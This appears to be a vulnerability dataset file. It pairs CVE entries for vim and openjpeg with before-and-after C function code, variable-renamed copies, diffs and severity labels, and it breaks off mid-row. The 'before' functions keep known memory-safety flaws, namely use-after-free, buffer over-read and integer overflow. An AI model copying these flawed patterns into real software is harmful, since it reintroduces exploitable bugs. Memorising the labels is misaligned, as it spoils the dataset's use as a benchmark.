
Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/userfunc.c,get_function_line,"static char_u *
get_function_line(
exarg_T*eap,
char_u**line_to_free,
intindent,
getline_opt_Tgetline_options)
{
char_u *theline;
if (eap->getline == NULL)
theline = getcmdline(':', 0L, indent, 0);
else
theline = eap->getline(':', eap->cookie, indent, getline_options);
if (theline != NULL)
{
if (*eap->cmdlinep == *line_to_free)
*eap->cmdlinep = theline;
vim_free(*line_to_free);
*line_to_free = theline;
}
return theline;
}","static char_u *
get_function_line(
exarg_T*VAR_0,
char_u**VAR_1,
intVAR_2,
getline_opt_TVAR_3)
{
char_u *VAR_4;
if (VAR_0->getline == NULL)
VAR_4 = getcmdline(':', 0L, VAR_2, 0);
else
VAR_4 = VAR_0->getline(':', VAR_0->cookie, VAR_2, VAR_3);
if (VAR_4 != NULL)
{
if (*VAR_0->cmdlinep == *VAR_1)
*VAR_0->cmdlinep = VAR_4;
vim_free(*VAR_1);
*VAR_1 = VAR_4;
}
return VAR_4;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/before/5.json,"static char_u *
get_function_line(
	exarg_T		*eap,
	garray_T	*lines_to_free,
	int		indent,
	getline_opt_T	getline_options)
{
    char_u *theline;

    if (eap->getline == NULL)
	theline = getcmdline(':', 0L, indent, 0);
    else
	theline = eap->getline(':', eap->cookie, indent, getline_options);
    if (theline != NULL)
    {
	if (lines_to_free->ga_len > 0
		&& *eap->cmdlinep == ((char_u **)lines_to_free->ga_data)
						   [lines_to_free->ga_len - 1])
	    *eap->cmdlinep = theline;
	ga_add_string(lines_to_free, theline);
    }

    return theline;
}","static char_u *
get_function_line(
	exarg_T		*VAR_0,
	garray_T	*VAR_1,
	int		VAR_2,
	getline_opt_T	VAR_3)
{
    char_u *VAR_4;

    if (VAR_0->getline == NULL)
	VAR_4 = getcmdline(':', 0L, VAR_2, 0);
    else
	VAR_4 = VAR_0->getline(':', VAR_0->cookie, VAR_2, VAR_3);
    if (VAR_4 != NULL)
    {
	if (VAR_1->ga_len > 0
		&& *VAR_0->cmdlinep == ((char_u **)VAR_1->ga_data)
						   [VAR_1->ga_len - 1])
	    *VAR_0->cmdlinep = VAR_4;
	ga_add_string(VAR_1, VAR_4);
    }

    return VAR_4;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/after/5.json,"--- func_before
+++ func_after
@@ -1,7 +1,7 @@
 static char_u *
 get_function_line(
 	exarg_T		*eap,
-	char_u		**line_to_free,
+	garray_T	*lines_to_free,
 	int		indent,
 	getline_opt_T	getline_options)
 {
@@ -13,10 +13,11 @@
 	theline = eap->getline(':', eap->cookie, indent, getline_options);
     if (theline != NULL)
     {
-	if (*eap->cmdlinep == *line_to_free)
+	if (lines_to_free->ga_len > 0
+		&& *eap->cmdlinep == ((char_u **)lines_to_free->ga_data)
+						   [lines_to_free->ga_len - 1])
 	    *eap->cmdlinep = theline;
-	vim_free(*line_to_free);
-	*line_to_free = theline;
+	ga_add_string(lines_to_free, theline);
     }
 
     return theline;","{'deleted_lines': ['\tchar_u\t\t**line_to_free,', '\tif (*eap->cmdlinep == *line_to_free)', '\tvim_free(*line_to_free);', '\t*line_to_free = theline;'], 'added_lines': ['\tgarray_T\t*lines_to_free,', '\tif (lines_to_free->ga_len > 0', '\t\t&& *eap->cmdlinep == ((char_u **)lines_to_free->ga_data)', '\t\t\t\t\t\t   [lines_to_free->ga_len - 1])', '\tga_add_string(lines_to_free, theline);']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/message.c,ignore_error_for_testing,"void
ignore_error_for_testing(char_u *error)
{
if (ignore_error_list.ga_itemsize == 0)
ga_init2(&ignore_error_list, sizeof(char_u *), 1);
if (STRCMP(""RESET"", error) == 0)
ga_clear_strings(&ignore_error_list);
else
ga_add_string(&ignore_error_list, error);
}","void
ignore_error_for_testing(char_u *VAR_0)
{
if (VAR_1.ga_itemsize == 0)
ga_init2(&VAR_1, sizeof(char_u *), 1);
if (STRCMP(""RESET"", VAR_0) == 0)
ga_clear_strings(&VAR_1);
else
ga_add_string(&VAR_1, VAR_0);
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/message.c/vul/before/0.json,"void
ignore_error_for_testing(char_u *error)
{
    if (ignore_error_list.ga_itemsize == 0)
	ga_init2(&ignore_error_list, sizeof(char_u *), 1);

    if (STRCMP(""RESET"", error) == 0)
	ga_clear_strings(&ignore_error_list);
    else
	ga_copy_string(&ignore_error_list, error);
}","void
ignore_error_for_testing(char_u *VAR_0)
{
    if (VAR_1.ga_itemsize == 0)
	ga_init2(&VAR_1, sizeof(char_u *), 1);

    if (STRCMP(""RESET"", VAR_0) == 0)
	ga_clear_strings(&VAR_1);
    else
	ga_copy_string(&VAR_1, VAR_0);
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/message.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -7,5 +7,5 @@
     if (STRCMP(""RESET"", error) == 0)
 	ga_clear_strings(&ignore_error_list);
     else
-	ga_add_string(&ignore_error_list, error);
+	ga_copy_string(&ignore_error_list, error);
 }","{'deleted_lines': ['\tga_add_string(&ignore_error_list, error);'], 'added_lines': ['\tga_copy_string(&ignore_error_list, error);']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/alloc.c,ga_init2,"void
ga_init2(garray_T *gap, int itemsize, int growsize)
{
ga_init(gap);
gap->ga_itemsize = itemsize;
gap->ga_growsize = growsize;
}","void
ga_init2(garray_T *VAR_0, int VAR_1, int VAR_2)
{
ga_init(VAR_0);
VAR_0->ga_itemsize = VAR_1;
VAR_0->ga_growsize = VAR_2;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/alloc.c/vul/before/0.json,"void
ga_init2(garray_T *gap, size_t itemsize, int growsize)
{
    ga_init(gap);
    gap->ga_itemsize = itemsize;
    gap->ga_growsize = growsize;
}","void
ga_init2(garray_T *VAR_0, size_t VAR_1, int VAR_2)
{
    ga_init(VAR_0);
    VAR_0->ga_itemsize = VAR_1;
    VAR_0->ga_growsize = VAR_2;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/alloc.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,5 +1,5 @@
 void
-ga_init2(garray_T *gap, int itemsize, int growsize)
+ga_init2(garray_T *gap, size_t itemsize, int growsize)
 {
     ga_init(gap);
     gap->ga_itemsize = itemsize;","{'deleted_lines': ['ga_init2(garray_T *gap, int itemsize, int growsize)'], 'added_lines': ['ga_init2(garray_T *gap, size_t itemsize, int growsize)']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/alloc.c,ga_add_string,"int
ga_add_string(garray_T *gap, char_u *p)
{
char_u *cp = vim_strsave(p);
if (cp == NULL)
return FAIL;
if (ga_grow(gap, 1) == FAIL)
{
vim_free(cp);
return FAIL;
}
((char_u **)(gap->ga_data))[gap->ga_len++] = cp;
return OK;
}","int
ga_add_string(garray_T *VAR_0, char_u *VAR_1)
{
char_u *VAR_2 = vim_strsave(VAR_1);
if (VAR_2 == NULL)
return VAR_3;
if (ga_grow(VAR_0, 1) == VAR_3)
{
vim_free(VAR_2);
return VAR_3;
}
((char_u **)(VAR_0->ga_data))[VAR_0->ga_len++] = VAR_2;
return VAR_4;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/alloc.c/vul/before/1.json,"int
ga_add_string(garray_T *gap, char_u *p)
{
    if (ga_grow(gap, 1) == FAIL)
	return FAIL;
    ((char_u **)(gap->ga_data))[gap->ga_len++] = p;
    return OK;
}","int
ga_add_string(garray_T *VAR_0, char_u *VAR_1)
{
    if (ga_grow(VAR_0, 1) == VAR_2)
	return VAR_2;
    ((char_u **)(VAR_0->ga_data))[VAR_0->ga_len++] = VAR_1;
    return VAR_3;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/alloc.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,16 +1,8 @@
 int
 ga_add_string(garray_T *gap, char_u *p)
 {
-    char_u *cp = vim_strsave(p);
-
-    if (cp == NULL)
+    if (ga_grow(gap, 1) == FAIL)
 	return FAIL;
-
-    if (ga_grow(gap, 1) == FAIL)
-    {
-	vim_free(cp);
-	return FAIL;
-    }
-    ((char_u **)(gap->ga_data))[gap->ga_len++] = cp;
+    ((char_u **)(gap->ga_data))[gap->ga_len++] = p;
     return OK;
 }","{'deleted_lines': ['    char_u *cp = vim_strsave(p);', '', '    if (cp == NULL)', '', '    if (ga_grow(gap, 1) == FAIL)', '    {', '\tvim_free(cp);', '\treturn FAIL;', '    }', '    ((char_u **)(gap->ga_data))[gap->ga_len++] = cp;'], 'added_lines': ['    if (ga_grow(gap, 1) == FAIL)', '    ((char_u **)(gap->ga_data))[gap->ga_len++] = p;']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0158,['CWE-122'],AV:N/AC:M/Au:N/C:P/I:N/A:N,0,vim,"patch 8.2.4049: Vim9: reading before the start of the line with ""$""

Problem:    Vim9: reading before the start of the line with ""$"" by itself.
Solution:   Do not subtract one when reporting the error.",5f25c3855071bd7e26255c68bf458b1b5cf92f39,https://github.com/vim/vim/commit/5f25c3855071bd7e26255c68bf458b1b5cf92f39,src/vim9expr.c,compile_get_env,"static int
compile_get_env(char_u **arg, cctx_T *cctx)
{
char_u*start = *arg;
intlen;
intret;
char_u*name;
++*arg;
len = get_env_len(arg);
if (len == 0)
{
semsg(_(e_syntax_error_at_str), start - 1);
return FAIL;
}
name = vim_strnsave(start, len + 1);
ret = generate_LOAD(cctx, ISN_LOADENV, 0, name, &t_string);
vim_free(name);
return ret;
}","static int
compile_get_env(char_u **VAR_0, cctx_T *VAR_1)
{
char_u*VAR_2 = *VAR_0;
intVAR_3;
intVAR_4;
char_u*VAR_5;
++*VAR_0;
VAR_3 = get_env_len(VAR_0);
if (VAR_3 == 0)
{
semsg(_(VAR_6), VAR_2 - 1);
return VAR_7;
}
VAR_5 = vim_strnsave(VAR_2, VAR_3 + 1);
VAR_4 = generate_LOAD(VAR_1, VAR_8, 0, VAR_5, &VAR_9);
vim_free(VAR_5);
return VAR_4;
}",vim/5f25c3855071bd7e26255c68bf458b1b5cf92f39/vim9expr.c/vul/before/0.json,"static int
compile_get_env(char_u **arg, cctx_T *cctx)
{
    char_u	*start = *arg;
    int		len;
    int		ret;
    char_u	*name;

    ++*arg;
    len = get_env_len(arg);
    if (len == 0)
    {
	semsg(_(e_syntax_error_at_str), start);
	return FAIL;
    }

    // include the '$' in the name, eval_env_var() expects it.
    name = vim_strnsave(start, len + 1);
    ret = generate_LOAD(cctx, ISN_LOADENV, 0, name, &t_string);
    vim_free(name);
    return ret;
}","static int
compile_get_env(char_u **VAR_0, cctx_T *VAR_1)
{
    char_u	*VAR_2 = *VAR_0;
    int		VAR_3;
    int		VAR_4;
    char_u	*VAR_5;

    ++*VAR_0;
    VAR_3 = get_env_len(VAR_0);
    if (VAR_3 == 0)
    {
	semsg(_(VAR_6), VAR_2);
	return VAR_7;
    }

    /* COMMENT_0 */
    VAR_5 = vim_strnsave(VAR_2, VAR_3 + 1);
    VAR_4 = generate_LOAD(VAR_1, VAR_8, 0, VAR_5, &VAR_9);
    vim_free(VAR_5);
    return VAR_4;
}",vim/5f25c3855071bd7e26255c68bf458b1b5cf92f39/vim9expr.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -10,7 +10,7 @@
     len = get_env_len(arg);
     if (len == 0)
     {
-	semsg(_(e_syntax_error_at_str), start - 1);
+	semsg(_(e_syntax_error_at_str), start);
 	return FAIL;
     }
 ","{'deleted_lines': ['\tsemsg(_(e_syntax_error_at_str), start - 1);'], 'added_lines': ['\tsemsg(_(e_syntax_error_at_str), start);']}",True,vim is vulnerable to Heap-based Buffer Overflow,3.3,LOW,0,valid,2022-01-09T13:36:28Z,4
CVE-2021-29338,['CWE-190'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,uclouvain/openjpeg,"Fix integer overflow in num_images

Includes the fix for CVE-2021-29338
Credit to @kaniini based on #1346
Fixes #1338",f0727df07c4d944d7d1c5002451cfbc9545d3288,https://github.com/uclouvain/openjpeg/commit/f0727df07c4d944d7d1c5002451cfbc9545d3288,src/bin/jp2/opj_dump.c,main,"int main(int argc, char *argv[])
{
FILE *fout = NULL;
opj_dparameters_t parameters;           
opj_image_t* image = NULL;                  
opj_codec_t* l_codec = NULL;                
opj_stream_t *l_stream = NULL;              
opj_codestream_info_v2_t* cstr_info = NULL;
opj_codestream_index_t* cstr_index = NULL;
OPJ_INT32 num_images, imageno;
img_fol_t img_fol;
dircnt_t *dirptr = NULL;
opj_set_default_decoder_parameters(&parameters);
memset(&img_fol, 0, sizeof(img_fol_t));
img_fol.flag = OPJ_IMG_INFO | OPJ_J2K_MH_INFO | OPJ_J2K_MH_IND;
if (parse_cmdline_decoder(argc, argv, &parameters, &img_fol) == 1) {
if (img_fol.imgdirpath) {
free(img_fol.imgdirpath);
}
return EXIT_FAILURE;
}
if (img_fol.set_imgdir == 1) {
int it_image;
num_images = get_num_images(img_fol.imgdirpath);
dirptr = (dircnt_t*)malloc(sizeof(dircnt_t));
if (!dirptr) {
return EXIT_FAILURE;
}
dirptr->filename_buf = (char*)malloc((size_t)num_images * OPJ_PATH_LEN * sizeof(
char)); 
if (!dirptr->filename_buf) {
free(dirptr);
return EXIT_FAILURE;
}
dirptr->filename = (char**) malloc((size_t)num_images * sizeof(char*));
if (!dirptr->filename) {
goto fails;
}
for (it_image = 0; it_image < num_images; it_image++) {
dirptr->filename[it_image] = dirptr->filename_buf + it_image * OPJ_PATH_LEN;
}
if (load_images(dirptr, img_fol.imgdirpath) == 1) {
goto fails;
}
if (num_images == 0) {
fprintf(stdout, ""Folder is empty\n"");
goto fails;
}
} else {
num_images = 1;
}
if (parameters.outfile[0] != 0) {
fout = fopen(parameters.outfile, ""w"");
if (!fout) {
fprintf(stderr, ""ERROR -> failed to open %s for writing\n"", parameters.outfile);
goto fails;
}
} else {
fout = stdout;
}
for (imageno = 0; imageno < num_images ; imageno++) {
fprintf(stderr, ""\n"");
if (img_fol.set_imgdir == 1) {
if (get_next_file(imageno, dirptr, &img_fol, &parameters)) {
fprintf(stderr, ""skipping file...\n"");
continue;
}
}
l_stream = opj_stream_create_default_file_stream(parameters.infile, 1);
if (!l_stream) {
fprintf(stderr, ""ERROR -> failed to create the stream from the file %s\n"",
parameters.infile);
goto fails;
}
switch (parameters.decod_format) {
case J2K_CFMT: { 
l_codec = opj_create_decompress(OPJ_CODEC_J2K);
break;
}
case JP2_CFMT: { 
l_codec = opj_create_decompress(OPJ_CODEC_JP2);
break;
}
case JPT_CFMT: { 
l_codec = opj_create_decompress(OPJ_CODEC_JPT);
break;
}
default:
fprintf(stderr, ""skipping file..\n"");
opj_stream_destroy(l_stream);
continue;
}
opj_set_info_handler(l_codec, info_callback, 00);
opj_set_warning_handler(l_codec, warning_callback, 00);
opj_set_error_handler(l_codec, error_callback, 00);
parameters.flags |= OPJ_DPARAMETERS_DUMP_FLAG;
if (!opj_setup_decoder(l_codec, &parameters)) {
fprintf(stderr, ""ERROR -> opj_dump: failed to setup the decoder\n"");
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
fclose(fout);
goto fails;
}
if (! opj_read_header(l_stream, l_codec, &image)) {
fprintf(stderr, ""ERROR -> opj_dump: failed to read the header\n"");
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
opj_image_destroy(image);
fclose(fout);
goto fails;
}
opj_dump_codec(l_codec, img_fol.flag, fout);
cstr_info = opj_get_cstr_info(l_codec);
cstr_index = opj_get_cstr_index(l_codec);
opj_stream_destroy(l_stream);
if (l_codec) {
opj_destroy_codec(l_codec);
}
opj_image_destroy(image);
opj_destroy_cstr_index(&cstr_index);
opj_destroy_cstr_info(&cstr_info);
}
fclose(fout);
return EXIT_SUCCESS;
fails:
if (dirptr) {
if (dirptr->filename) {
free(dirptr->filename);
}
if (dirptr->filename_buf) {
free(dirptr->filename_buf);
}
free(dirptr);
}
return EXIT_FAILURE;
}","int main(int VAR_0, char *VAR_1[])
{
FILE *VAR_2 = NULL;
opj_dparameters_t VAR_3;           
opj_image_t* VAR_4 = NULL;                  
opj_codec_t* VAR_5 = NULL;                
opj_stream_t *VAR_6 = NULL;              
opj_codestream_info_v2_t* VAR_7 = NULL;
opj_codestream_index_t* VAR_8 = NULL;
OPJ_INT32 VAR_9, VAR_10;
img_fol_t VAR_11;
dircnt_t *VAR_12 = NULL;
opj_set_default_decoder_parameters(&VAR_3);
memset(&VAR_11, 0, sizeof(img_fol_t));
VAR_11.flag = VAR_13 | VAR_14 | VAR_15;
if (parse_cmdline_decoder(VAR_0, VAR_1, &VAR_3, &VAR_11) == 1) {
if (VAR_11.imgdirpath) {
free(VAR_11.imgdirpath);
}
return VAR_16;
}
if (VAR_11.set_imgdir == 1) {
int VAR_17;
VAR_9 = get_num_images(VAR_11.imgdirpath);
VAR_12 = (dircnt_t*)malloc(sizeof(dircnt_t));
if (!VAR_12) {
return VAR_16;
}
VAR_12->filename_buf = (char*)malloc((size_t)VAR_9 * VAR_18 * sizeof(
char)); 
if (!VAR_12->filename_buf) {
free(VAR_12);
return VAR_16;
}
VAR_12->filename = (char**) malloc((size_t)VAR_9 * sizeof(char*));
if (!VAR_12->filename) {
goto fails;
}
for (VAR_17 = 0; VAR_17 < VAR_9; VAR_17++) {
VAR_12->filename[VAR_17] = VAR_12->filename_buf + VAR_17 * VAR_18;
}
if (load_images(VAR_12, VAR_11.imgdirpath) == 1) {
goto fails;
}
if (VAR_9 == 0) {
fprintf(VAR_19, ""Folder is empty\n"");
goto fails;
}
} else {
VAR_9 = 1;
}
if (VAR_3.outfile[0] != 0) {
VAR_2 = fopen(VAR_3.outfile, ""w"");
if (!VAR_2) {
fprintf(VAR_20, ""ERROR -> failed to open %s for writing\n"", VAR_3.outfile);
goto fails;
}
} else {
VAR_2 = VAR_19;
}
for (VAR_10 = 0; VAR_10 < VAR_9 ; VAR_10++) {
fprintf(VAR_20, ""\n"");
if (VAR_11.set_imgdir == 1) {
if (get_next_file(VAR_10, VAR_12, &VAR_11, &VAR_3)) {
fprintf(VAR_20, ""skipping file...\n"");
continue;
}
}
VAR_6 = opj_stream_create_default_file_stream(VAR_3.infile, 1);
if (!VAR_6) {
fprintf(VAR_20, ""ERROR -> failed to create the stream from the file %s\n"",
VAR_3.infile);
goto fails;
}
switch (VAR_3.decod_format) {
case VAR_21: { 
VAR_5 = opj_create_decompress(VAR_22);
break;
}
case VAR_23: { 
VAR_5 = opj_create_decompress(VAR_24);
break;
}
case VAR_25: { 
VAR_5 = opj_create_decompress(VAR_26);
break;
}
default:
fprintf(VAR_20, ""skipping file..\n"");
opj_stream_destroy(VAR_6);
continue;
}
opj_set_info_handler(VAR_5, VAR_27, 00);
opj_set_warning_handler(VAR_5, VAR_28, 00);
opj_set_error_handler(VAR_5, VAR_29, 00);
VAR_3.flags |= VAR_30;
if (!opj_setup_decoder(VAR_5, &VAR_3)) {
fprintf(VAR_20, ""ERROR -> opj_dump: failed to setup the decoder\n"");
opj_stream_destroy(VAR_6);
opj_destroy_codec(VAR_5);
fclose(VAR_2);
goto fails;
}
if (! opj_read_header(VAR_6, VAR_5, &VAR_4)) {
fprintf(VAR_20, ""ERROR -> opj_dump: failed to read the header\n"");
opj_stream_destroy(VAR_6);
opj_destroy_codec(VAR_5);
opj_image_destroy(VAR_4);
fclose(VAR_2);
goto fails;
}
opj_dump_codec(VAR_5, VAR_11.flag, VAR_2);
VAR_7 = opj_get_cstr_info(VAR_5);
VAR_8 = opj_get_cstr_index(VAR_5);
opj_stream_destroy(VAR_6);
if (VAR_5) {
opj_destroy_codec(VAR_5);
}
opj_image_destroy(VAR_4);
opj_destroy_cstr_index(&VAR_8);
opj_destroy_cstr_info(&VAR_7);
}
fclose(VAR_2);
return VAR_31;
fails:
if (VAR_12) {
if (VAR_12->filename) {
free(VAR_12->filename);
}
if (VAR_12->filename_buf) {
free(VAR_12->filename_buf);
}
free(VAR_12);
}
return VAR_16;
}",uclouvain/openjpeg/f0727df07c4d944d7d1c5002451cfbc9545d3288/opj_dump.c/vul/before/0.json,"int main(int argc, char *argv[])
{
    FILE *fout = NULL;

    opj_dparameters_t parameters;           /* Decompression parameters */
    opj_image_t* image = NULL;                  /* Image structure */
    opj_codec_t* l_codec = NULL;                /* Handle to a decompressor */
    opj_stream_t *l_stream = NULL;              /* Stream */
    opj_codestream_info_v2_t* cstr_info = NULL;
    opj_codestream_index_t* cstr_index = NULL;

    OPJ_INT32 num_images, imageno;
    img_fol_t img_fol;
    dircnt_t *dirptr = NULL;

    /* Set decoding parameters to default values */
    opj_set_default_decoder_parameters(&parameters);

    /* Initialize img_fol */
    memset(&img_fol, 0, sizeof(img_fol_t));
    img_fol.flag = OPJ_IMG_INFO | OPJ_J2K_MH_INFO | OPJ_J2K_MH_IND;

    /* Parse input and get user encoding parameters */
    if (parse_cmdline_decoder(argc, argv, &parameters, &img_fol) == 1) {
        if (img_fol.imgdirpath) {
            free(img_fol.imgdirpath);
        }

        return EXIT_FAILURE;
    }

    /* Initialize reading of directory */
    if (img_fol.set_imgdir == 1) {
        int it_image;
        num_images = get_num_images(img_fol.imgdirpath);

        dirptr = (dircnt_t*)malloc(sizeof(dircnt_t));
        if (!dirptr) {
            return EXIT_FAILURE;
        }
        /* Stores at max 10 image file names*/
        dirptr->filename_buf = (char*) calloc((size_t) num_images,
                                              OPJ_PATH_LEN * sizeof(char));
        if (!dirptr->filename_buf) {
            free(dirptr);
            return EXIT_FAILURE;
        }
        dirptr->filename = (char**) calloc((size_t) num_images, sizeof(char*));

        if (!dirptr->filename) {
            goto fails;
        }

        for (it_image = 0; it_image < num_images; it_image++) {
            dirptr->filename[it_image] = dirptr->filename_buf + it_image * OPJ_PATH_LEN;
        }

        if (load_images(dirptr, img_fol.imgdirpath) == 1) {
            goto fails;
        }

        if (num_images == 0) {
            fprintf(stdout, ""Folder is empty\n"");
            goto fails;
        }
    } else {
        num_images = 1;
    }

    /* Try to open for writing the output file if necessary */
    if (parameters.outfile[0] != 0) {
        fout = fopen(parameters.outfile, ""w"");
        if (!fout) {
            fprintf(stderr, ""ERROR -> failed to open %s for writing\n"", parameters.outfile);
            goto fails;
        }
    } else {
        fout = stdout;
    }

    /* Read the header of each image one by one */
    for (imageno = 0; imageno < num_images ; imageno++) {

        fprintf(stderr, ""\n"");

        if (img_fol.set_imgdir == 1) {
            if (get_next_file(imageno, dirptr, &img_fol, &parameters)) {
                fprintf(stderr, ""skipping file...\n"");
                continue;
            }
        }

        /* Read the input file and put it in memory */
        /* ---------------------------------------- */

        l_stream = opj_stream_create_default_file_stream(parameters.infile, 1);
        if (!l_stream) {
            fprintf(stderr, ""ERROR -> failed to create the stream from the file %s\n"",
                    parameters.infile);
            goto fails;
        }

        /* Read the JPEG2000 stream */
        /* ------------------------ */

        switch (parameters.decod_format) {
        case J2K_CFMT: { /* JPEG-2000 codestream */
            /* Get a decoder handle */
            l_codec = opj_create_decompress(OPJ_CODEC_J2K);
            break;
        }
        case JP2_CFMT: { /* JPEG 2000 compressed image data */
            /* Get a decoder handle */
            l_codec = opj_create_decompress(OPJ_CODEC_JP2);
            break;
        }
        case JPT_CFMT: { /* JPEG 2000, JPIP */
            /* Get a decoder handle */
            l_codec = opj_create_decompress(OPJ_CODEC_JPT);
            break;
        }
        default:
            fprintf(stderr, ""skipping file..\n"");
            opj_stream_destroy(l_stream);
            continue;
        }

        /* catch events using our callbacks and give a local context */
        opj_set_info_handler(l_codec, info_callback, 00);
        opj_set_warning_handler(l_codec, warning_callback, 00);
        opj_set_error_handler(l_codec, error_callback, 00);

        parameters.flags |= OPJ_DPARAMETERS_DUMP_FLAG;

        /* Setup the decoder decoding parameters using user parameters */
        if (!opj_setup_decoder(l_codec, &parameters)) {
            fprintf(stderr, ""ERROR -> opj_dump: failed to setup the decoder\n"");
            opj_stream_destroy(l_stream);
            opj_destroy_codec(l_codec);
            fclose(fout);
            goto fails;
        }

        /* Read the main header of the codestream and if necessary the JP2 boxes*/
        if (! opj_read_header(l_stream, l_codec, &image)) {
            fprintf(stderr, ""ERROR -> opj_dump: failed to read the header\n"");
            opj_stream_destroy(l_stream);
            opj_destroy_codec(l_codec);
            opj_image_destroy(image);
            fclose(fout);
            goto fails;
        }

        opj_dump_codec(l_codec, img_fol.flag, fout);

        cstr_info = opj_get_cstr_info(l_codec);

        cstr_index = opj_get_cstr_index(l_codec);

        /* close the byte stream */
        opj_stream_destroy(l_stream);

        /* free remaining structures */
        if (l_codec) {
            opj_destroy_codec(l_codec);
        }

        /* destroy the image header */
        opj_image_destroy(image);

        /* destroy the codestream index */
        opj_destroy_cstr_index(&cstr_index);

        /* destroy the codestream info */
        opj_destroy_cstr_info(&cstr_info);

    }

    /* Close the output file */
    fclose(fout);

    return EXIT_SUCCESS;

fails:
    if (dirptr) {
        if (dirptr->filename) {
            free(dirptr->filename);
        }
        if (dirptr->filename_buf) {
            free(dirptr->filename_buf);
        }
        free(dirptr);
    }
    return EXIT_FAILURE;
}","int main(int VAR_0, char *VAR_1[])
{
    FILE *VAR_2 = NULL;

    opj_dparameters_t VAR_3;           /* COMMENT_0 */
    opj_image_t* VAR_4 = NULL;                  /* COMMENT_1 */
    opj_codec_t* VAR_5 = NULL;                /* COMMENT_2 */
    opj_stream_t *VAR_6 = NULL;              /* COMMENT_3 */
    opj_codestream_info_v2_t* VAR_7 = NULL;
    opj_codestream_index_t* VAR_8 = NULL;

    OPJ_INT32 VAR_9, VAR_10;
    img_fol_t VAR_11;
    dircnt_t *VAR_12 = NULL;

    /* COMMENT_4 */
    opj_set_default_decoder_parameters(&VAR_3);

    /* COMMENT_5 */
    memset(&VAR_11, 0, sizeof(img_fol_t));
    VAR_11.flag = VAR_13 | VAR_14 | VAR_15;

    /* COMMENT_6 */
    if (parse_cmdline_decoder(VAR_0, VAR_1, &VAR_3, &VAR_11) == 1) {
        if (VAR_11.imgdirpath) {
            free(VAR_11.imgdirpath);
        }

        return VAR_16;
    }

    /* COMMENT_7 */
    if (VAR_11.set_imgdir == 1) {
        int VAR_17;
        VAR_9 = get_num_images(VAR_11.imgdirpath);

        VAR_12 = (dircnt_t*)malloc(sizeof(dircnt_t));
        if (!VAR_12) {
            return VAR_16;
        }
        /* COMMENT_8 */
        VAR_12->filename_buf = (char*) calloc((size_t) VAR_9,
                                              VAR_18 * sizeof(char));
        if (!VAR_12->filename_buf) {
            free(VAR_12);
            return VAR_16;
        }
        VAR_12->filename = (char**) calloc((size_t) VAR_9, sizeof(char*));

        if (!VAR_12->filename) {
            goto fails;
        }

        for (VAR_17 = 0; VAR_17 < VAR_9; VAR_17++) {
            VAR_12->filename[VAR_17] = VAR_12->filename_buf + VAR_17 * VAR_18;
        }

        if (load_images(VAR_12, VAR_11.imgdirpath) == 1) {
            goto fails;
        }

        if (VAR_9 == 0) {
            fprintf(VAR_19, ""Folder is empty\n"");
            goto fails;
        }
    } else {
        VAR_9 = 1;
    }

    /* COMMENT_9 */
    if (VAR_3.outfile[0] != 0) {
        VAR_2 = fopen(VAR_3.outfile, ""w"");
        if (!VAR_2) {
            fprintf(VAR_20, ""ERROR -> failed to open %s for writing\n"", VAR_3.outfile);
            goto fails;
        }
    } else {
        VAR_2 = VAR_19;
    }

    /* COMMENT_10 */
    for (VAR_10 = 0; VAR_10 < VAR_9 ; VAR_10++) {

        fprintf(VAR_20, ""\n"");

        if (VAR_11.set_imgdir == 1) {
            if (get_next_file(VAR_10, VAR_12, &VAR_11, &VAR_3)) {
                fprintf(VAR_20, ""skipping file...\n"");
                continue;
            }
        }

        /* COMMENT_11 */
        /* COMMENT_12 */

        VAR_6 = opj_stream_create_default_file_stream(VAR_3.infile, 1);
        if (!VAR_6) {
            fprintf(VAR_20, ""ERROR -> failed to create the stream from the file %s\n"",
                    VAR_3.infile);
            goto fails;
        }

        /* COMMENT_13 */
        /* COMMENT_14 */

        switch (VAR_3.decod_format) {
